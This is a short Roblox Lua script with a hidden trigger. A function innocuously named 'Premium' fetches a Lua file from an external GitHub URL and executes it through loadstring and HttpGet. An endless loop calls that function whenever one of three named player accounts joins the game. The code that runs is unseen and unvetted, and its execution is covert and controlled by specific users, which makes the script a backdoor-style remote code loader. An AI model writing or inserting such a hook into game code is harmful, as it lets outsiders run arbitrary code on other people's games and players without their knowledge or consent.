function Premium()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NgHuyZzZ/nghuydeptrai/main/gg.lua"))()
end
spawn(function()
    while wait() do
    for i,v in pairs(game.Players:GetPlayers()) do
        if v.Name == "ngminhhuy_lol" or v.Name == "Huy_Nguyen3" or v.Name == "MOBI_36" then
            Premium()
            end
        end
    end
end)
